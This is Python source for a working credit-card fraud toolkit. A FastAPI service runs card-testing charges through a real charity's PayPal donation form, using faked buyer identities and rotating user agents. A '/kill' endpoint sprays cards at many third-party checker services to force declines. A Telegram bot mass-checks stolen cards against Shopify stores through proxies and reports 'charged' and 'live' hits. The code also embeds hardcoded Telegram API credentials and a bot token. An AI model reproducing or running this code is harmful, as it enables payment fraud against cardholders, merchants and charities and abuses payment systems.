
import re
import requests
from fake_useragent import UserAgent
from faker import Faker
import json
import random
import time
import asyncio
from datetime import datetime
from fastapi import HTTPException
from pydantic import BaseModel
from typing import Optional
from fastapi import FastAPI
import aiohttp
import traceback
from urllib.parse import quote

session = requests.Session()
app = FastAPI()

Z = '\033[1;31m'
F = '\033[2;32m'
GRAY = '\033[1;30m'
ORANGE = '\033[38;5;208m'
RESET = '\033[0m'

# Uncommon names to randomize
UNCOMMON_FIRST_NAMES = [
    "Ezra", "Silas", "Thaddeus", "Leander", "Cornelius", "Beauregard", "Percival",
    "Matthias", "Augustine", "Octavius", "Caspian", "Orson", "Merrick", "Dashiell",
    "Alistair", "Bowen", "Casimir", "Dexter", "Emerson", "Flemming", "Gideon",
    "Henryk", "Ignatius", "Jasper", "Klaus", "Leroy", "Maverick", "Nolan",
    "Oberon", "Phineas", "Quincy", "Rasmus", "Seamus", "Theron", "Ulysses",
    "Valentino", "Wolfgang", "Xander", "Yarrow", "Zephyr", "Aileron", "Brodrick",
    "Calloway", "Darby", "Edison", "Finley", "Gaston", "Hadrian", "Isidore"
]

UNCOMMON_LAST_NAMES = [
    "Wickham", "Ashford", "Whitmore", "Pembroke", "Blackwell", "Thornton", "Beaumont",
    "Cheltenham", "Dalrymple", "Etheridge", "Fairfax", "Grayson", "Harrington", "Iverson",
    "Jamison", "Kensington", "Lockwood", "Mansfield", "Northwick", "Osborne", "Prescott",
    "Queensbury", "Ridgeway", "Somerfield", "Talmadge", "Underwood", "Vanderbilt", "Westbrook",
    "Xanthippe", "Yarborough", "Zelinski", "Ashby", "Blakeley", "Cromwell", "Dalton",
    "Elmsworth", "Foxworth", "Gainsborough", "Hackett", "Ingersoll", "Jocelyn", "Keaton"
]

# Rate limiter - track user check times (user_id: timestamp)
user_check_times = {}
RATE_LIMIT_SECONDS = 5  # Minimum 5 seconds between checks per user


# Request/Response Models
class CardRequest(BaseModel):
    num: str
    mon: str
    yer: str
    cvc: str

class CheckResponse(BaseModel):
    card_number: str
    status: str
    message: str
    details: Optional[dict] = None

# Queue to handle concurrent requests without overlapping
check_queue = asyncio.Queue()
MAX_CONCURRENT = 1  # Process one card at a time to avoid overlapping

def generate_random_email(fake=None):
    """Generate random email with numbers to avoid account restrictions"""
    first_part = get_uncommon_first_name().lower() + str(random.randint(100000, 999999))
    second_part = get_uncommon_last_name().lower() + str(random.randint(10000, 99999))
    third_part = str(random.randint(100000, 999999))
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "mail.com", "icloud.com", "aol.com", "tutanota.com"]
    domain = random.choice(domains)
    return f"{first_part}_{second_part}_{third_part}@{domain}"

def get_uncommon_first_name():
    """Get random uncommon first name"""
    return random.choice(UNCOMMON_FIRST_NAMES)

def get_uncommon_last_name():
    """Get random uncommon last name"""
    return random.choice(UNCOMMON_LAST_NAMES)

def info_requests():
    us = UserAgent().random
    r = requests.Session()
    fake = Faker()
    return us, r, fake

def var_response_msg(us, r):
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        response = r.get(url, headers=headers, timeout=10)
        hash = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)[0]
        form_id = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)[0]
        prefix = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)[0]
        
        if not hash or not form_id or not prefix:
            return None, None, None
        return hash, form_id, prefix
    except Exception as e:
        print(f"Error in var_response_msg: {e}")
        return None, None, None

def requests_id(us, r, fake, hash, form_id, prefix):
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash,
        'give-amount': '5.00',
        'give_first': get_uncommon_first_name(),
        'give_last': get_uncommon_last_name(),
        'give_email': generate_random_email(fake)
    }
    
    headers = {'User-Agent': us}
    
    try:
        response = r.post(url, data=payload, headers=headers, timeout=10)
        id = response.json()["data"]["id"]
        return id
    except Exception as e:
        print(f"Error in requests_id: {e}")
        return None

def info_cards(card):
    c = card["num"]
    info_card = {
        '3': 'JCB',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }.get(c[0], "Unknown card type")
    return info_card

def response_msg(card, us, r, fake, id, info_card):
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": "\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ",
        "variables": {
            "token": id,
            "card": {
                "cardNumber": card["num"],
                "type": info_card,
                "expirationDate": card["mon"] + '/20' + card["yer"],
                "postalCode": fake.zipcode(),
                "securityCode": card["cvc"],
            },
            "phoneNumber": fake.phone_number(),
            "firstName": get_uncommon_first_name(),
            "lastName": get_uncommon_last_name(),
            "billingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": generate_random_email(fake),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }
    
    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        time.sleep(random.randint(2, 5))
        return response.text
    except Exception as e:
        print(f"Error in response_msg: {e}")
        return str(e)

def parse_response(card, text_paypal, fake):
    card_info = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
    
    if "accessToken" in text_paypal or "cartId" in text_paypal:
        status = "CHARGED"
        msg = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️"
    elif "INVALID_SECURITY_CODE" in text_paypal:
        status = "CVV_FAILURE"
        msg = "CVV2_FAILURE! ❇️"
    elif "GRAPHQL_VALIDATION_FAILED" in text_paypal:
        status = "VALIDATION_FAILED"
        msg = "GRAPHQL_VALIDATION_FAILED"
    elif "EXISTING_ACCOUNT_RESTRICTED" in text_paypal:
        status = "ACCOUNT_RESTRICTED"
        msg = "EXISTING ACCOUNT RESTRICTED!"
    elif "RISK_DISALLOWED" in text_paypal:
        status = "RISK_DISALLOWED"
        msg = "RISK_DISALLOWED"
    elif "ISSUER_DATA_NOT_FOUND" in text_paypal:
        status = "DATA_NOT_FOUND"
        msg = "ISSUER_DATA_NOT_FOUND"
    elif "INVALID_BILLING_ADDRESS" in text_paypal:
        status = "INSUFFICIENT_FUNDS"
        msg = "INSUFFICIENT_FUNDS! ❇️"
    elif "R_ERROR" in text_paypal:
        status = "GENERIC_ERROR"
        msg = "CARD_GENERIC_ERROR"
    elif "ISSUER_DECLINE" in text_paypal:
        status = "ISSUER_DECLINE"
        msg = "ISSUER_DECLINE"
    elif "EXPIRED_CARD" in text_paypal:
        status = "EXPIRED"
        msg = "EXPIRED_CARD"
    elif "LOGIN_ERROR" in text_paypal:
        status = "LOGIN_ERROR"
        msg = "LOGIN_ERROR"
    elif "VALIDATION_ERROR" in text_paypal:
        status = "VALIDATION_ERROR"
        msg = "VALIDATION_ERROR"
    else:
        status = "UNKNOWN"
        msg = text_paypal[:100]
    
    return {
        "card_number": card_info,
        "status": status,
        "message": msg,
        "details": {
            "first_name": get_uncommon_first_name(),
            "last_name": get_uncommon_last_name(),
            "email": generate_random_email(fake),
            "timestamp": datetime.now().isoformat()
        }
    }

async def check_card(card: dict):
    """Process a single card check"""
    try:
        time.sleep(random.randint(1, 3))
        
        us, r, fake = info_requests()
        hash, form_id, prefix = var_response_msg(us, r)
        
        if not hash or not form_id or not prefix:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve form data"
            }
        
        id = requests_id(us, r, fake, hash, form_id, prefix)
        
        if not id:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve payment token"
            }
        
        info_card = info_cards(card)
        text_paypal = response_msg(card, us, r, fake, id, info_card)
        
        result = parse_response(card, text_paypal, fake)
        return result
    
    except Exception as e:
        return {
            "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
            "status": "ERROR",
            "message": str(e)
        }




# API Endpoints
@app.post("/paypal", response_model=CheckResponse)
async def paypal_single(card: CardRequest):
    """Check a single card - processes sequentially to avoid overlapping"""
    try:
        result = await paypal(card.model_dump())
        return CheckResponse(**result)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/paypal_mass")
async def check_batch(cards: list[CardRequest]):
    """Check multiple cards - queued to process without overlapping"""
    results = []
    
    for card in cards:
        result = await paypal(card.model_dump())
        results.append(result)
        time.sleep(random.randint(6, 10))  # Delay between checks
    
    return {
        "total": len(cards),
        "results": results,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/health")
async def health():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/")
async def root():
    """API information"""
    return {
        "name": "Card Checker API",
        "version": "1.0.0",
        "endpoints": {
            "check": "POST /check - Check a single card",
            "killer": "GET /kill",
            "check_batch": "POST /check-batch - Check multiple cards",
            "health": "GET /health - Health check",
            "docs": "GET /docs - Interactive API documentation"
        }
    }





killed = 0

dead_card = {}

from typing import List



@app.get("/kill")
async def kill(cc: str):

    global killed

    num, mm, yy, cvv = cc.split("|")

    result = await kill_card(num, mm, yy, cvv)

    if not result:
        return {
            "card": cc,
            "status": "failed",
            "response": "No Decline Found",
            "message": "No API returned decline.",
            "total_killed": killed
        }

    return result



async def kill_card(num: str, mm: str, yy: str, cvv: str):

    api_template_01 = f'https://stripe360-production.up.railway.app/stripe_1?auth=WTFH4RSH&cc='

    api_template_02 = f'https://stripe360-production.up.railway.app/stripe_2?auth=WTFH4RSH&cc='

    api_template_03 = f'https://stripe360-production.up.railway.app/stripe_3?auth=WTFH4RSH&cc='

    api_template_04 = f'https://autoshopify-production-d008.up.railway.app/shopify?site=https://keyesco.myshopify.com&cc='

    api_template_05 = f'https://haters.cxchk.site/shopii?site=https://keyesco.myshopify.com&cc='

    api_template_06 = f'https://web-production-07260.up.railway.app/razorpay?cc='

    api_template_07 = f'https://stripe360-production.up.railway.app/razorpay?auth=WTFH4RSH&cc='

    api_template_08 = f'https://stripe360-production.up.railway.app/stripe_4?auth=WTFH4RSH&cc='

    api_template_09 = f'https://stripe360-production.up.railway.app/stripe_5?auth=WTFH4RSH&cc='

    api_template_10 = f'https://stripe360-production.up.railway.app/stripe_6?auth=WTFH4RSH&cc='

    api_template_11 = f'https://stripe360-production.up.railway.app/stripe_7?auth=WTFH4RSH&cc='

    api_template_12 = f'https://stripe360-production.up.railway.app/stripe_8?auth=WTFH4RSH&cc='

    api_template_13 = f'https://stripe360-production.up.railway.app/stripe_9?auth=WTFH4RSH&cc='




    global killed

    api_templates = [
        api_template_01,
        api_template_02,
        api_template_03,
        api_template_04,
        api_template_05,
        api_template_06,
        api_template_07,
        api_template_08,
        api_template_09,
        api_template_10,
        api_template_11,
        api_template_12,
        api_template_13
    ]

    original_card = f"{num}|{mm}|{yy}|{cvv}"

    connector = aiohttp.TCPConnector(
        limit=100,
        ttl_dns_cache=300,
        ssl=False
    )

    timeout = aiohttp.ClientTimeout(total=20)

    stop_event = asyncio.Event()
    lock = asyncio.Lock()

    result = None

    async def check_api(session, api_template):

        nonlocal result

        if stop_event.is_set():
            return

        try:
            random_cvv = random.randint(100, 999)

            card_with_cvv = f"{num}|{mm}|{yy}|{random_cvv}"

            api_url = f"{api_template}{quote(card_with_cvv, safe='')}"

            if "razorpay.me" in api_url:
                api_url += "&site=https://razorpay.me/@holidaymoodsadventure&proxy="

            async with session.get(api_url) as response:

                text = await response.text()

                print(f"[{response.status}] {api_url}")

                lowered = text.lower()

                if any(x in lowered for x in [
                    "declined",
                    "card declined",
                    "decline"
                ]):

                    async with lock:

                        global killed

                        if stop_event.is_set():
                            return

                        killed += 1

                        result = {
                            "card": original_card,
                            "status": "success",
                            "response": "Card Declined",
                            "message": "Card has been killed successfully.",
                            "total_killed": killed
                        }

                        print(f"[KILLED] {card_with_cvv}")

                        

        except asyncio.TimeoutError:
            print(f"[TIMEOUT] {api_template}")

        except aiohttp.ClientError as e:
            print(f"[AIOHTTP ERROR] {api_template} -> {e}")

        except Exception:
            print(f"[UNKNOWN ERROR] {api_template}")
            traceback.print_exc()

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:

        tasks = [
            asyncio.create_task(check_api(session, api))
            for api in api_templates
        ]

        await asyncio.gather(*tasks)

    if result:
        return result

    return {
        "card": original_card,
        "status": "failed",
        "response": "No Decline Found",
        "message": "No API returned a decline response.",
        "total_killed": killed
        }
    




import requests; session = requests.Session()
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime
# Direct API endpoint (replaces checker_bridge)
CHECKER_API_URL = 'https://autoshopify-production-e4f6.up.railway.app'

KILLER_API = 'https://strong-production.up.railway.app/kill'

KILLER_ALLOWED_USERS = {}

OWNER_ID = 6127646960

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
    "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
    "❌": "6037570896766438989",   # 💀 White Skull (Dark Glow)
    "⚡": "6026367225466720832",   # ⚡ Yellow Lightning Bolt
    "💳": "5971944878815317190",   # 💫 Floating Color Dots
    "💠": "5971837723676249096",   # 🌀 Neon Circle Rings
    "📝": "6023660820544623088",   # ✨
    "🌐": "6026367225466720832",   # ⚡
    "🎯": "5974235702701853774",   # 🟠🟡🟢 Triple Ring Loader
    "🤖": "6057466460886799210",   # 😼 Dark Cat Face
    "🤵": "4949560993840629085",   # 🧠 Golden Maze
    "💰": "5971944878815317190",   # 💫
    "⏸️": "6001440193058444284",   # ⚙️ Arc Reactor
    "▶️": "6285315214673975495",   # ➡️ Neon Arrow Right
    "🛑": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "📊": "5971837723676249096",   # 🌀
    "📦": "6066395745139824604",   # 🎀 Neon Pink Bow
    "📋": "5974235702701853774",   # Triple Ring
    "🔄": "5971837723676249096",   # 🌀 Neon Circle Rings
    "⏳": "5971837723676249096",   # 🌀
    "🚀": "6282977077427702833",   # 🎉 Color Confetti
    "⚠️": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "💎": "6023660820544623088",   # ✨
}

def premium_emoji(text):
    """Replace Unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis.
    Requires a Telethon/parser that supports <tg-emoji emoji-id="ID"> in HTML (e.g. Telethon 2.x or custom parser).
    Bot must be created with a Telegram Premium account for custom emojis to send."""
    if not text:
        return text
    # Use placeholders to avoid replacing the same emoji inside tags again
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# Bot Configuration
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8787942133:AAGUJDtde16taNdVzMhHyq8D7qXhlsJGtak'


# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

# Initialize bot
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Store active checking sessions
active_sessions = {}

# Dead site error keywords
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)
# --- UPDATED LOADING FUNCTIONS ---
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    """Check if user is premium - Reads file fresh every check"""
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    """Check a single card against a site using the direct checker API"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {
            'cc': card,
            'url': site,
            'proxy': proxy
        }
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    """Check a card with automatic retry"""
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)  # Reduced from 0.5

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    """Send real-time notification with new design"""
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=5248903529">ㅤㅤＫａｍａｌ</a></b>"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass



async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update progress message with new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    """Send final results with txt file and new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    # Build hits text
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    """Test a single site using the direct checker API with a test card"""
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    """Test a single proxy using the direct checker API with a test card and site"""
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'url': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
